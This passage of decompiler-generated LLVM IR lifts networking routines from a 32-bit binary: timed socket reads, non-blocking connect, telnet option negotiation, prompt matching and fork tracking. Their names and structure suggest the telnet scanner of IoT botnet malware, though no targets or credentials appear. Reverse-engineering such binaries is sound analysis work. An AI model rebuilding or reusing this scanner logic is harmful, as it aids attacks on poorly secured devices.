  %v3_9d24 = load i32, i32* %stack_var_0, align 4
  %v3_9d28 = call i32 @contains_string(i32 %tmp, i32 %v3_9d24)
  %v2_9d30 = icmp ne i32 %v3_9d28, 0
  %. = zext i1 %v2_9d30 to i32
  store i32 %v3_9cb4, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i8 %v2_9d04, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_9d20, { 1, 0 }
}

define i32 @read_with_timeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9da0.lr.ph:
  %stack_var_-160 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9d60 = load i32, i32* @fp, align 4
  store i32 %v3_9d60, i32* %stack_var_-16, align 4
  store i32 0, i32* %stack_var_-160, align 4
  %v2_9d8c = ptrtoint i32* %stack_var_-152 to i32
  br label %dec_label_pc_9da0

dec_label_pc_9da0:                                ; preds = %dec_label_pc_9da0.lr.ph, %dec_label_pc_9da0
  %storemerge25 = phi i32 [ 0, %dec_label_pc_9da0.lr.ph ], [ %v1_9db4, %dec_label_pc_9da0 ]
  %v5_9dac = mul nuw nsw i32 %storemerge25, 4
  %v6_9dac = add i32 %v5_9dac, %v2_9d8c
  %v7_9dac = inttoptr i32 %v6_9dac to i32*
  store i32 0, i32* %v7_9dac, align 4
  %v1_9db4 = add nuw nsw i32 %storemerge25, 1
  %tmp21 = icmp ult i32 %v1_9db4, 32
  br i1 %tmp21, label %dec_label_pc_9da0, label %dec_label_pc_9dc8

dec_label_pc_9dc8:                                ; preds = %dec_label_pc_9da0
  %v13_9d60 = ptrtoint i32* %stack_var_-16 to i32
  %v3_9dcc = udiv i32 %arg1, 32
  %v3_9dd8 = mul nuw nsw i32 %v3_9dcc, 4
  %v2_9de0 = add nsw i32 %v3_9dd8, -136
  %v2_9de4 = add i32 %v2_9de0, %v13_9d60
  %v1_9de8 = inttoptr i32 %v2_9de4 to i32*
  %v2_9de8 = load i32, i32* %v1_9de8, align 4
  %v1_9df0 = urem i32 %arg1, 32
  %v6_9df8 = shl i32 1, %v1_9df0
  %v2_9dfc = or i32 %v2_9de8, %v6_9df8
  store i32 %v2_9dfc, i32* %v1_9de8, align 4
  %v1_9e1c = add i32 %arg1, 1
  %v2_9e24 = ptrtoint i32* %stack_var_-160 to i32
  %v5_9e38 = call i32 @__libc_select(i32 %v1_9e1c, i32 %v2_9d8c, i32 0, i32 0, i32 %v2_9e24)
  %v5_9e44 = icmp sgt i32 %v5_9e38, 0
  br i1 %v5_9e44, label %dec_label_pc_9e54, label %dec_label_pc_9e48

dec_label_pc_9e48:                                ; preds = %dec_label_pc_9dc8
  br label %dec_label_pc_9e74

dec_label_pc_9e54:                                ; preds = %dec_label_pc_9dc8
  %v5_9e68 = inttoptr i32 %arg3 to i32*
  %v6_9e68 = call i32 @__libc_recv(i32 %arg1, i32* %v5_9e68, i32 %arg4, i32 0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_9e74

dec_label_pc_9e74:                                ; preds = %dec_label_pc_9e48, %dec_label_pc_9e54
  %storemerge = phi i32 [ %v6_9e68, %dec_label_pc_9e54 ], [ 0, %dec_label_pc_9e48 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %storemerge25, { 1, 0 }
  uselistorder i32 %v2_9d8c, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-160, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 1, 0 }
  uselistorder label %dec_label_pc_9e74, { 1, 0 }
  uselistorder label %dec_label_pc_9da0, { 1, 0 }
}

define i32 @advance_state(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg2, i32* %stack_var_-24, align 4
  %v2_9ea0 = icmp eq i32 %arg2, 0
  br i1 %v2_9ea0, label %dec_label_pc_9ea8, label %dec_label_pc_9eb8

dec_label_pc_9ea8:                                ; preds = %entry
  %v2_9eac = load i32, i32* %arg1, align 4
  %v1_9eb4 = call i32 @__libc_close(i32 %v2_9eac)
  br label %dec_label_pc_9eb8

dec_label_pc_9eb8:                                ; preds = %entry, %dec_label_pc_9ea8
  %v2_9ec0 = add i32 %tmp, 16
  %v3_9ec0 = inttoptr i32 %v2_9ec0 to i32*
  store i32 0, i32* %v3_9ec0, align 4
  %v3_9ec4 = load i32, i32* %stack_var_-24, align 4
  %v1_9ed0 = trunc i32 %v3_9ec4 to i8
  %v3_9ed0 = add i32 %tmp, 8
  %v4_9ed0 = inttoptr i32 %v3_9ed0 to i8*
  store i8 %v1_9ed0, i8* %v4_9ed0, align 1
  %v1_9ed8 = add i32 %tmp, 24
  %v2_9ed8 = inttoptr i32 %v1_9ed8 to i32*
  %v3_9ed8 = load i32, i32* %v2_9ed8, align 4
  store i32 1024, i32* @r2, align 4
  %v2_9ee8 = inttoptr i32 %v3_9ed8 to i8*
  %v3_9ee8 = call i32 @__GI_memset(i8* %v2_9ee8, i32 0)
  ret i32 %v3_9ee8

; uselistorder directives
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9eb8, { 1, 0 }
}

define i32 @reset_telstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v3_9ef8 = load i32, i32* @fp, align 4
  %v2_9f10 = inttoptr i32 %arg1 to i32*
  %v3_9f10 = call i32 @advance_state(i32* %v2_9f10, i32 0)
  %v3_9f1c = add i32 %arg1, 9
  %v4_9f1c = inttoptr i32 %v3_9f1c to i8*
  store i8 1, i8* %v4_9f1c, align 1
  store i32 %v3_9ef8, i32* @fp, align 4
  ret i32 %v3_9f10
}

define i32 @contains_success(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9f28 = load i32, i32* @fp, align 4
  %v3_9f40 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([3 x i8*]* @global_var_2d200.62 to i32))
  store i32 %v3_9f28, i32* @fp, align 4
  ret i32 %v3_9f40
}

define i32 @contains_fail(i32 %arg1) local_unnamed_addr {
entry:
  %v3_9f58 = load i32, i32* @fp, align 4
  %v3_9f70 = call i32 @contains_string(i32 %arg1, i32 ptrtoint ([7 x i8*]* @global_var_2d1e0.71 to i32))
  store i32 %v3_9f58, i32* @fp, align 4
  ret i32 %v3_9f70

; uselistorder directives
  uselistorder i32 (i32, i32)* @contains_string, { 2, 1, 0 }
}

define i32 @contains_response(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 40848, i32* %stack_var_-4, align 4
  %v2_9f8c = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9f8c, i32* @fp, align 4
  %v1_9f9c = call i32 @contains_success(i32 %arg1)
  %v2_9fa4 = icmp eq i32 %v1_9f9c, 0
  br i1 %v2_9fa4, label %dec_label_pc_9fac, label %dec_label_pc_9fd4

dec_label_pc_9fac:                                ; preds = %entry
  %v1_9fb0 = call i32 @contains_fail(i32 %arg1)
  %v2_9fb8 = icmp ne i32 %v1_9fb0, 0
  %. = zext i1 %v2_9fb8 to i32
  br label %dec_label_pc_9fd4

dec_label_pc_9fd4:                                ; preds = %dec_label_pc_9fac, %entry
  %storemerge1 = phi i32 [ 1, %entry ], [ %., %dec_label_pc_9fac ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
}

define i32 @contains_string(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  br label %dec_label_pc_a014

dec_label_pc_a014:                                ; preds = %dec_label_pc_a014, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ %v1_a018, %dec_label_pc_a014 ]
  %v1_a018 = add i32 %stack_var_-24.0, 1
  %v3_a024 = mul i32 %v1_a018, 4
  %v2_a030 = add i32 %v3_a024, %arg2
  %v1_a034 = inttoptr i32 %v2_a030 to i32*
  %v2_a034 = load i32, i32* %v1_a034, align 4
  %v2_a038 = icmp eq i32 %v2_a034, 0
  br i1 %v2_a038, label %dec_label_pc_a094.preheader, label %dec_label_pc_a014

dec_label_pc_a094.preheader:                      ; preds = %dec_label_pc_a014
  %v3_a06c = inttoptr i32 %arg1 to i8*
  br label %dec_label_pc_a094

dec_label_pc_a04c:                                ; preds = %dec_label_pc_a094
  %v3_a050 = mul i32 %storemerge2, 4
  %v2_a05c = add i32 %v3_a050, %arg2
  %v1_a060 = inttoptr i32 %v2_a05c to i32*
  %v2_a060 = load i32, i32* %v1_a060, align 4
  %v4_a06c = call i32 @strcasestr(i8* %v3_a06c, i32 %v2_a060, i32 %v3_a050)
  %v2_a074 = icmp eq i32 %v4_a06c, 0
  %v1_a08c = add nuw i32 %storemerge2, 1
  br i1 %v2_a074, label %dec_label_pc_a094, label %dec_label_pc_a0ac

dec_label_pc_a094:                                ; preds = %dec_label_pc_a04c, %dec_label_pc_a094.preheader
  %storemerge2 = phi i32 [ %v1_a08c, %dec_label_pc_a04c ], [ 0, %dec_label_pc_a094.preheader ]
  %v5_a0a0 = icmp slt i32 %storemerge2, %v1_a018
  br i1 %v5_a0a0, label %dec_label_pc_a04c, label %dec_label_pc_a0ac

dec_label_pc_a0ac:                                ; preds = %dec_label_pc_a094, %dec_label_pc_a04c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a04c ], [ 0, %dec_label_pc_a094 ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %storemerge2, { 2, 0, 1 }
  uselistorder i32 %v1_a018, { 1, 0, 2 }
}

define i32 @connectTimeout(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-192 = alloca i32, align 4
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a0c0 = load i32, i32* @fp, align 4
  store i32 %v3_a0c0, i32* %stack_var_-16, align 4
  %v13_a0c0 = ptrtoint i32* %stack_var_-16 to i32
  store i32 0, i32* @r2, align 4
  %v2_a0e8 = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a0f8 = or i32 %v2_a0e8, 2048
  store i32 %v1_a0f8, i32* @r2, align 4
  %v2_a10c = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  store i32 2, i32* %stack_var_-48, align 4
  %v3_a128 = urem i32 %arg3, 65536
  %v1_a130 = call i32 @htons(i32 %v3_a128)
  %v3_a158 = call i32 @getHost(i32 %arg2, i32* nonnull %stack_var_-44)
  %v2_a160 = icmp eq i32 %v3_a158, 0
  br i1 %v2_a160, label %dec_label_pc_a174, label %dec_label_pc_a168

dec_label_pc_a168:                                ; preds = %entry
  br label %dec_label_pc_a32c

dec_label_pc_a174:                                ; preds = %entry
  %v3_a19c = bitcast i32* %stack_var_-48 to %sockaddr*
  %v4_a19c = call i32 @__libc_connect(i32 %arg1, %sockaddr* %v3_a19c, i32 16)
  %v1_a1ac = icmp slt i32 %v4_a19c, 0
  br i1 %v1_a1ac, label %dec_label_pc_a1b4, label %dec_label_pc_a2f0

dec_label_pc_a1b4:                                ; preds = %dec_label_pc_a174
  %v0_a1b4 = call i32 @__errno_location()
  %v1_a1bc = inttoptr i32 %v0_a1b4 to i32*
  %v2_a1bc = load i32, i32* %v1_a1bc, align 4
  %v7_a1c0 = icmp eq i32 %v2_a1bc, 115
  br i1 %v7_a1c0, label %dec_label_pc_a1ec.lr.ph, label %dec_label_pc_a2e4

dec_label_pc_a1ec.lr.ph:                          ; preds = %dec_label_pc_a1b4
  store i32 %arg4, i32* %stack_var_-184, align 4
  %v2_a1d8 = ptrtoint i32* %stack_var_-176 to i32
  br label %dec_label_pc_a1ec

dec_label_pc_a1ec:                                ; preds = %dec_label_pc_a1ec.lr.ph, %dec_label_pc_a1ec
  %storemerge14 = phi i32 [ 0, %dec_label_pc_a1ec.lr.ph ], [ %v1_a200, %dec_label_pc_a1ec ]
  %v5_a1f8 = mul nuw nsw i32 %storemerge14, 4
  %v6_a1f8 = add i32 %v5_a1f8, %v2_a1d8
  %v7_a1f8 = inttoptr i32 %v6_a1f8 to i32*
  store i32 0, i32* %v7_a1f8, align 4
  %v1_a200 = add nuw nsw i32 %storemerge14, 1
  %tmp32 = icmp ult i32 %v1_a200, 32
  br i1 %tmp32, label %dec_label_pc_a1ec, label %dec_label_pc_a214

dec_label_pc_a214:                                ; preds = %dec_label_pc_a1ec
  %v3_a218 = udiv i32 %arg1, 32
  %v3_a224 = mul nuw nsw i32 %v3_a218, 4
  %v2_a22c = add nsw i32 %v3_a224, -160
  %v2_a230 = add i32 %v2_a22c, %v13_a0c0
  %v1_a234 = inttoptr i32 %v2_a230 to i32*
  %v2_a234 = load i32, i32* %v1_a234, align 4
  %v1_a23c = urem i32 %arg1, 32
  %v6_a244 = shl i32 1, %v1_a23c
  %v2_a248 = or i32 %v2_a234, %v6_a244
  store i32 %v2_a248, i32* %v1_a234, align 4
  %v1_a268 = add i32 %arg1, 1
  %v2_a270 = ptrtoint i32* %stack_var_-184 to i32
  %v5_a288 = call i32 @__libc_select(i32 %v1_a268, i32 0, i32 %v2_a1d8, i32 0, i32 %v2_a270)
  %tmp33 = icmp slt i32 %v5_a288, 1
  br i1 %tmp33, label %dec_label_pc_a2d8, label %dec_label_pc_a298

dec_label_pc_a298:                                ; preds = %dec_label_pc_a214
  %v0_a2bc = call i32 @getsockopt()
  %v3_a2c0 = load i32, i32* %stack_var_-192, align 4
  %v2_a2c4 = icmp eq i32 %v3_a2c0, 0
  br i1 %v2_a2c4, label %dec_label_pc_a2f0, label %dec_label_pc_a2cc

dec_label_pc_a2cc:                                ; preds = %dec_label_pc_a298
  br label %dec_label_pc_a32c

dec_label_pc_a2d8:                                ; preds = %dec_label_pc_a214
  br label %dec_label_pc_a32c

dec_label_pc_a2e4:                                ; preds = %dec_label_pc_a1b4
  br label %dec_label_pc_a32c

dec_label_pc_a2f0:                                ; preds = %dec_label_pc_a174, %dec_label_pc_a298
  store i32 0, i32* @r2, align 4
  %v2_a2fc = call i32 @__libc_fcntl(i32 %arg1, i32 3)
  %v1_a30c = and i32 %v2_a2fc, -2049
  store i32 %v1_a30c, i32* @r2, align 4
  %v2_a320 = call i32 @__libc_fcntl(i32 %arg1, i32 4)
  br label %dec_label_pc_a32c

dec_label_pc_a32c:                                ; preds = %dec_label_pc_a2e4, %dec_label_pc_a2d8, %dec_label_pc_a2cc, %dec_label_pc_a168, %dec_label_pc_a2f0
  %stack_var_-212.0 = phi i32 [ 0, %dec_label_pc_a2d8 ], [ 1, %dec_label_pc_a2f0 ], [ 0, %dec_label_pc_a2cc ], [ 0, %dec_label_pc_a2e4 ], [ 0, %dec_label_pc_a168 ]
  ret i32 %stack_var_-212.0

; uselistorder directives
  uselistorder i32 %storemerge14, { 1, 0 }
  uselistorder i32 %v2_a1d8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-184, { 1, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_a32c, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_a2f0, { 1, 0 }
  uselistorder label %dec_label_pc_a1ec, { 1, 0 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_0 = alloca i32, align 4
  %v1_a33c = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_a33c, i32* @ip, align 4
  %v3_a340 = load i32, i32* @r4, align 4
  %v6_a340 = load i32, i32* @r5, align 4
  %v9_a340 = load i32, i32* @r6, align 4
  %v0_a34c = call i32 @__libc_fork()
  %v2_a35c = icmp eq i32 %v0_a34c, 0
  br i1 %v2_a35c, label %dec_label_pc_a4bc, label %dec_label_pc_a370

dec_label_pc_a370:                                ; preds = %entry
  %v2_a374 = load i32, i32* @global_var_2d60c.73, align 4
  %v5_a374 = load i32, i32* @global_var_2d610.74, align 4
  %v2_a380 = add i32 %v2_a374, 1
  %v3_a380 = icmp eq i32 %v2_a380, 0
  %v4_a384 = zext i1 %v3_a380 to i32
  %v5_a384 = add i32 %v4_a384, %v5_a374
  store i32 %v2_a380, i32* @global_var_2d60c.73, align 4
  store i32 %v5_a384, i32* @global_var_2d610.74, align 4
  %v3_a398 = udiv i32 %v2_a380, 1073741824
  %v3_a39c = mul i32 %v5_a384, 4
  %v2_a3a0 = or i32 %v3_a39c, %v3_a398
  store i32 %v2_a3a0, i32* @r4, align 4
  %v3_a3a4 = mul i32 %v2_a380, 4
  %v1_a3a8 = add i32 %v3_a3a4, 4
  %v1_a3b0 = call i32 @malloc(i32 %v1_a3a8)
  br label %dec_label_pc_a408

dec_label_pc_a3c8:                                ; preds = %dec_label_pc_a408, %dec_label_pc_a454
  %v3_a3cc = mul i32 %storemerge2, 4
  %v2_a3d8 = add i32 %v3_a3cc, %v1_a3b0
  %v2_a3ec = load i32, i32* @global_var_3388c.76, align 4
  %v2_a3f0 = add i32 %v2_a3ec, %v3_a3cc
  %v1_a3f4 = inttoptr i32 %v2_a3f0 to i32*
  %v2_a3f4 = load i32, i32* %v1_a3f4, align 4
  %v2_a3f8 = inttoptr i32 %v2_a3d8 to i32*
  store i32 %v2_a3f4, i32* %v2_a3f8, align 4
  %v1_a400 = add i32 %storemerge2, 1
  br label %dec_label_pc_a408

dec_label_pc_a408:                                ; preds = %dec_label_pc_a370, %dec_label_pc_a3c8
  %storemerge2 = phi i32 [ 0, %dec_label_pc_a370 ], [ %v1_a400, %dec_label_pc_a3c8 ]
  %v2_a420 = load i32, i32* @global_var_2d60c.73, align 4
  %v5_a420 = load i32, i32* @global_var_2d610.74, align 4
  %v2_a434 = add i32 %v2_a420, -1
  %v3_a434 = icmp ne i32 %v2_a420, 0
  %v3_a438 = add i32 %v5_a420, -1
  %v5_a438 = sext i1 %v3_a434 to i32
  %v9_a44c = icmp eq i32 %v3_a438, %v5_a438
  br i1 %v9_a44c, label %dec_label_pc_a454, label %dec_label_pc_a3c8

dec_label_pc_a454:                                ; preds = %dec_label_pc_a408
  store i32 %v2_a434, i32* @r5, align 4
  store i32 %storemerge2, i32* @r6, align 4
  %tmp = icmp ugt i32 %v2_a434, %storemerge2
  br i1 %tmp, label %dec_label_pc_a3c8, label %dec_label_pc_a474

dec_label_pc_a474:                                ; preds = %dec_label_pc_a454
  store i32 %v5_a420, i32* @r4, align 4
  %v3_a47c = mul i32 %v2_a420, 4
  %v2_a488 = add i32 %v1_a3b0, -4
  %v1_a48c = add i32 %v2_a488, %v3_a47c
  %v2_a494 = inttoptr i32 %v1_a48c to i32*
  store i32 %v0_a34c, i32* %v2_a494, align 4
  %v2_a49c = load i32, i32* @global_var_3388c.76, align 4
  store i32 %v2_a49c, i32* @r0, align 4
  %v0_a4a4 = call i32 @free()
  store i32 %v1_a3b0, i32* @global_var_3388c.76, align 4
  br label %dec_label_pc_a4bc

dec_label_pc_a4bc:                                ; preds = %entry, %dec_label_pc_a474
  store i32 %v3_a340, i32* @r4, align 4
  store i32 %v6_a340, i32* @r5, align 4
  store i32 %v9_a340, i32* @r6, align 4
  ret i32 %v0_a34c

; uselistorder directives
  uselistorder i32 %storemerge2, { 0, 2, 1, 3 }
  uselistorder i32 %v3_a3cc, { 1, 0 }
  uselistorder i32 %v1_a3b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a4bc, { 1, 0 }
  uselistorder label %dec_label_pc_a408, { 1, 0 }
  uselistorder label %dec_label_pc_a3c8, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %stack_var_-17 = alloca i8, align 1
  %v1_a4f4 = add i32 %arg2, 1
  %v1_a4f8 = inttoptr i32 %v1_a4f4 to i8*
  %v2_a4f8 = load i8, i8* %v1_a4f8, align 1
  %v7_a504 = icmp ult i8 %v2_a4f8, -5
  br i1 %v7_a504, label %dec_label_pc_a650, label %dec_label_pc_a50c

dec_label_pc_a50c:                                ; preds = %entry
  %v7_a514 = icmp eq i8 %v2_a4f8, -1
  br i1 %v7_a514, label %dec_label_pc_a518, label %dec_label_pc_a534

dec_label_pc_a518:                                ; preds = %dec_label_pc_a50c
  br label %dec_label_pc_a650

dec_label_pc_a534:                                ; preds = %dec_label_pc_a50c
  store i8 -1, i8* %stack_var_-17, align 1
  %v5_a550 = bitcast i8* %stack_var_-17 to i32*
  %v6_a550 = call i32 @__libc_send(i32 %arg1, i32* %v5_a550, i32 1, i32 16384)
  %v2_a55c = load i8, i8* %v1_a4f8, align 1
  %v7_a560 = icmp eq i8 %v2_a55c, -4
  br i1 %v7_a560, label %dec_label_pc_a568, label %dec_label_pc_a574

dec_label_pc_a568:                                ; preds = %dec_label_pc_a534
  store i8 -2, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a574:                                ; preds = %dec_label_pc_a534
  %v2_a57c = load i8, i8* %v1_a4f8, align 1
  %v7_a580 = icmp eq i8 %v2_a57c, -2
  br i1 %v7_a580, label %dec_label_pc_a588, label %dec_label_pc_a594

dec_label_pc_a588:                                ; preds = %dec_label_pc_a574
  store i8 -4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a594:                                ; preds = %dec_label_pc_a574
  %v2_a59c = load i8, i8* %v1_a4f8, align 1
  %v7_a5a0 = icmp eq i8 %v2_a59c, 3
  %v7_a5b4 = icmp eq i8 %v2_a59c, -3
  br i1 %v7_a5a0, label %dec_label_pc_a5a8, label %dec_label_pc_a5e0

dec_label_pc_a5a8:                                ; preds = %dec_label_pc_a594
  br i1 %v7_a5b4, label %dec_label_pc_a5bc, label %dec_label_pc_a5c8

dec_label_pc_a5bc:                                ; preds = %dec_label_pc_a5a8
  br label %dec_label_pc_a5d0

dec_label_pc_a5c8:                                ; preds = %dec_label_pc_a5a8
  br label %dec_label_pc_a5d0

dec_label_pc_a5d0:                                ; preds = %dec_label_pc_a5bc, %dec_label_pc_a5c8
  %storemerge = phi i8 [ -3, %dec_label_pc_a5c8 ], [ -5, %dec_label_pc_a5bc ]
  store i8 %storemerge, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a5e0:                                ; preds = %dec_label_pc_a594
  br i1 %v7_a5b4, label %dec_label_pc_a5f4, label %dec_label_pc_a600

dec_label_pc_a5f4:                                ; preds = %dec_label_pc_a5e0
  br label %dec_label_pc_a608

dec_label_pc_a600:                                ; preds = %dec_label_pc_a5e0
  br label %dec_label_pc_a608

dec_label_pc_a608:                                ; preds = %dec_label_pc_a5f4, %dec_label_pc_a600
  %storemerge4 = phi i8 [ -2, %dec_label_pc_a600 ], [ -4, %dec_label_pc_a5f4 ]
  store i8 %storemerge4, i8* %stack_var_-17, align 1
  br label %dec_label_pc_a614

dec_label_pc_a614:                                ; preds = %dec_label_pc_a5d0, %dec_label_pc_a588, %dec_label_pc_a568, %dec_label_pc_a608
  %v5_a628 = call i32 @__libc_send(i32 %arg1, i32* nonnull %v5_a550, i32 1, i32 16384)
  %v1_a630 = add i32 %arg2, 2
  %v4_a644 = inttoptr i32 %v1_a630 to i32*
  %v5_a644 = call i32 @__libc_send(i32 %arg1, i32* %v4_a644, i32 1, i32 16384)
  br label %dec_label_pc_a650

dec_label_pc_a650:                                ; preds = %dec_label_pc_a518, %dec_label_pc_a614, %entry
  ret i32 0

; uselistorder directives
  uselistorder i8* %stack_var_-17, { 5, 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_a650, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a614, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_a608, { 1, 0 }
  uselistorder label %dec_label_pc_a5d0, { 1, 0 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_a680 = call i32 @strlen(i8* %arg1)
  %v2_a6c8 = add i32 %v3_a680, %tmp
  br label %dec_label_pc_a79c

dec_label_pc_a6a0:                                ; preds = %dec_label_pc_a728, %dec_label_pc_a704, %dec_label_pc_a6e0, %dec_label_pc_a6bc
  %v1_a6a4 = add nsw i32 %stack_var_-24.013, 1
  %v7_a6b8 = icmp sgt i32 %v3_a680, %v1_a6a4
  br i1 %v7_a6b8, label %dec_label_pc_a6bc, label %dec_label_pc_a74c

dec_label_pc_a6bc:                                ; preds = %dec_label_pc_a6ac.preheader, %dec_label_pc_a6a0
  %stack_var_-24.013 = phi i32 [ %v1_a6a4, %dec_label_pc_a6a0 ], [ %stack_var_-24.1, %dec_label_pc_a6ac.preheader ]
  %v2_a6d0 = sub i32 %v2_a6c8, %stack_var_-24.013
  %v1_a6d4 = inttoptr i32 %v2_a6d0 to i8*
  %v2_a6d4 = load i8, i8* %v1_a6d4, align 1
  %v2_a6d8 = icmp eq i8 %v2_a6d4, 0
  br i1 %v2_a6d8, label %dec_label_pc_a6a0, label %dec_label_pc_a6e0

dec_label_pc_a6e0:                                ; preds = %dec_label_pc_a6bc
  %v2_a6f8 = load i8, i8* %v1_a6d4, align 1
  %v7_a6fc = icmp eq i8 %v2_a6f8, 32
  br i1 %v7_a6fc, label %dec_label_pc_a6a0, label %dec_label_pc_a704

dec_label_pc_a704:                                ; preds = %dec_label_pc_a6e0
  %v2_a71c = load i8, i8* %v1_a6d4, align 1
  %v7_a720 = icmp eq i8 %v2_a71c, 13
  br i1 %v7_a720, label %dec_label_pc_a6a0, label %dec_label_pc_a728

dec_label_pc_a728:                                ; preds = %dec_label_pc_a704
  %v2_a740 = load i8, i8* %v1_a6d4, align 1
  %v7_a744 = icmp eq i8 %v2_a740, 10
  br i1 %v7_a744, label %dec_label_pc_a6a0, label %dec_label_pc_a74c

dec_label_pc_a74c:                                ; preds = %dec_label_pc_a728, %dec_label_pc_a6a0, %dec_label_pc_a6ac.preheader
  %stack_var_-24.0.lcssa = phi i32 [ %stack_var_-24.1, %dec_label_pc_a6ac.preheader ], [ %stack_var_-24.013, %dec_label_pc_a728 ], [ %v1_a6a4, %dec_label_pc_a6a0 ]
  %v2_a760 = sub i32 %v2_a6c8, %stack_var_-24.0.lcssa
  %v1_a764 = inttoptr i32 %v2_a760 to i8*
  %v2_a764 = load i8, i8* %v1_a764, align 1
  %v2_a774 = add i32 %storemerge2, ptrtoint ([6 x i8]* @global_var_1b344.78 to i32)
  %v1_a778 = inttoptr i32 %v2_a774 to i8*
  %v2_a778 = load i8, i8* %v1_a778, align 1
  %v9_a77c = icmp eq i8 %v2_a764, %v2_a778
  %v1_a794 = add i32 %storemerge2, 1
  br i1 %v9_a77c, label %dec_label_pc_a7bc, label %dec_label_pc_a79c

dec_label_pc_a79c:                                ; preds = %dec_label_pc_a74c, %entry
  %stack_var_-24.1 = phi i32 [ 0, %entry ], [ %stack_var_-24.0.lcssa, %dec_label_pc_a74c ]
  %storemerge2 = phi i32 [ 0, %entry ], [ %v1_a794, %dec_label_pc_a74c ]
  %v3_a7a4 = call i32 @strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1b344.78, i32 0, i32 0))
  %v3_a7ac = icmp ult i32 %storemerge2, %v3_a7a4
  br i1 %v3_a7ac, label %dec_label_pc_a6ac.preheader, label %dec_label_pc_a7bc

dec_label_pc_a6ac.preheader:                      ; preds = %dec_label_pc_a79c
  %v7_a6b812 = icmp sgt i32 %v3_a680, %stack_var_-24.1
  br i1 %v7_a6b812, label %dec_label_pc_a6bc, label %dec_label_pc_a74c

dec_label_pc_a7bc:                                ; preds = %dec_label_pc_a79c, %dec_label_pc_a74c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_a74c ], [ 0, %dec_label_pc_a79c ]
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %stack_var_-24.1, { 2, 0, 1 }
  uselistorder i32 %stack_var_-24.0.lcssa, { 1, 0 }
  uselistorder i32 %v3_a680, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a74c, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_a7d4 = load i32, i32* @fp, align 4
  store i32 %v3_a7d4, i32* %stack_var_-16, align 4
  %v13_a7d4 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg4, i32* %stack_var_-176, align 4
  %v2_a824 = ptrtoint i32* %stack_var_-168 to i32
  %v3_a864 = udiv i32 %arg1, 32
  %v3_a870 = mul nuw nsw i32 %v3_a864, 4
  %v1_a888 = urem i32 %arg1, 32
  %v6_a890 = shl i32 1, %v1_a888
  %v1_a8b4 = add i32 %arg1, 1
  %v2_a8bc = ptrtoint i32* %stack_var_-176 to i32
  %v6_a9dc = inttoptr i32 %arg2 to i8*
  %v2_a9f0 = icmp eq i32 %arg3, 0
  %v1_a9fc = inttoptr i32 %arg6 to i8*
  %v5_aa40 = icmp sgt i32 %arg5, 0
  %v2_a878 = add nsw i32 %v3_a870, -152
  %v2_a87c = add i32 %v2_a878, %v13_a7d4
  %v1_a880 = inttoptr i32 %v2_a87c to i32*
  br label %dec_label_pc_aa18

dec_label_pc_a838.lr.ph:                          ; preds = %dec_label_pc_aa2c, %dec_label_pc_aa38
  br label %dec_label_pc_a838

